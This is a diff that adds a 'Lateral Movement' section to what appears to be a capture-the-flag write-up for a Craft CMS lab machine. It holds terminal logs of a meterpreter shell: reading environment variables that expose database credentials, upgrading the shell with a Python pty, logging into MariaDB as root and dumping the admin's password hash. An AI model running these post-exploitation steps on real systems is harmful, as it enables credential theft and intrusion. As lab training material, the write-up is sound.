@@ -159,7 +159,171 @@ meterpreter >
 
 ### Lateral Movement (if applicable)
 
+```
+meterpreter > shell
+Process 1535 created.
+Channel 0 created.
+/bin/bash -i
+bash: cannot set terminal process group (964): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@orion:~/html/craft/web$ ss -tlpn
+ss -tlpn
+State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess                                                 
+LISTEN 0      128          0.0.0.0:22        0.0.0.0:*                                                           
+LISTEN 0      511          0.0.0.0:80        0.0.0.0:*    users:(("nginx",pid=1089,fd=6),("nginx",pid=1088,fd=6))
+LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*                                                           
+LISTEN 0      10         127.0.0.1:23        0.0.0.0:*                                                           
+LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*                                                           
+LISTEN 0      128             [::]:22           [::]:*                                                           
+www-data@orion:~/html/craft/web$ env
+env
+CRAFT_ENVIRONMENT=dev
+CRAFT_DB_PORT=3306
+CRAFT_APP_ID=CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff
+PWD=/var/www/html/craft/web
+PRIMARY_SITE_URL=http://orion.htb/
+CRAFT_DB_DATABASE=orion
+HOME=/var/www
+CRAFT_DB_TABLE_PREFIX=
+CRAFT_DB_DRIVER=mysql
+CRAFT_DB_SERVER=127.0.0.1
+USER=www-data
+SHLVL=1
+CRAFT_DB_USER=root
+CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
+CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
+CRAFT_DISALLOW_ROBOTS=true
+CRAFT_DEV_MODE=true
+CRAFT_ALLOW_ADMIN_CHANGES=true
+CRAFT_DB_SCHEMA=
+_=/usr/bin/env
+www-data@orion:~/html/craft/web$ which python3
+which python3
+/usr/bin/python3
+www-data@orion:~/html/craft/web$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+<eb$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@orion:~/html/craft/web$ mysql -u root -p'SuperSecureCraft123Pass!' -h 127.0.0.1 orion
+<oot -p'SuperSecureCraft123Pass!' -h 127.0.0.1 orion
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 8148
+Server version: 10.6.23-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [orion]> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| orion              |
+| performance_schema |
+| sys                |
++--------------------+
+5 rows in set (0.001 sec)
+
+MariaDB [orion]> use orion;
+use orion;
+Database changed
+MariaDB [orion]> show tables;
+show tables;
++----------------------------+
+| Tables_in_orion            |
++----------------------------+
+| addresses                  |
+| announcements              |
+| assetindexdata             |
+| assetindexingsessions      |
+| assets                     |
+| assets_sites               |
+| authenticator              |
+| categories                 |
+| categorygroups             |
+| categorygroups_sites       |
+| changedattributes          |
+| changedfields              |
+| craftidtokens              |
+| deprecationerrors          |
+| drafts                     |
+| elementactivity            |
+| elements                   |
+| elements_bulkops           |
+| elements_owners            |
+| elements_sites             |
+| entries                    |
+| entries_authors            |
+| entrytypes                 |
+| fieldlayouts               |
+| fields                     |
+| globalsets                 |
+| gqlschemas                 |
+| gqltokens                  |
+| imagetransformindex        |
+| imagetransforms            |
+| info                       |
+| migrations                 |
+| plugins                    |
+| projectconfig              |
+| queue                      |
+| recoverycodes              |
+| relations                  |
+| resourcepaths              |
+| revisions                  |
+| searchindex                |
+| sections                   |
+| sections_entrytypes        |
+| sections_sites             |
+| sequences                  |
+| sessions                   |
+| shunnedmessages            |
+| sitegroups                 |
+| sites                      |
+| sso_identities             |
+| structureelements          |
+| structures                 |
+| systemmessages             |
+| taggroups                  |
+| tags                       |
+| tokens                     |
+| usergroups                 |
+| usergroups_users           |
+| userpermissions            |
+| userpermissions_usergroups |
+| userpermissions_users      |
+| userpreferences            |
+| users                      |
+| volumefolders              |
+| volumes                    |
+| webauthn                   |
+| widgets                    |
++----------------------------+
+66 rows in set (0.001 sec)
+
+MariaDB [orion]> select * from users;
+select * from users;
++----+---------+------------------+--------+---------+--------+-----------+-------+----------+----------+-----------+----------+----------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
+| id | photoId | affiliatedSiteId | active | pending | locked | suspended | admin | username | fullName | firstName | lastName | email          | password                                                     | lastLoginDate       | lastLoginAttemptIp | invalidLoginWindowStart | invalidLoginCount | lastInvalidLoginDate | lockoutDate | hasDashboard | verificationCode | verificationCodeIssuedDate | unverifiedEmail | passwordResetRequired | lastPasswordChangeDate | dateCreated         | dateUpdated         |
++----+---------+------------------+--------+---------+--------+-----------+-------+----------+----------+-----------+----------+----------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
+|  1 |    NULL |             NULL |      1 |       0 |      0 |         0 |     1 | admin    | NULL     | NULL      | NULL     | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS | 2026-03-12 11:25:04 | NULL               | NULL                    |              NULL | NULL                 | NULL        |            1 | NULL             | NULL                       | NULL            |                     0 | 2026-03-12 11:24:51    | 2026-03-06 11:24:45 | 2026-03-12 11:25:04 |
++----+---------+------------------+--------+---------+--------+-----------+-------+----------+----------+-----------+----------+----------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
+1 row in set (0.001 sec)
+
+MariaDB [orion]> 
+
+```
+
+```
+www-data@orion:~/html/craft/web$ ls /home
+ls /home
+adam
+
+```
 
 ---
 ## Privilege Escalation
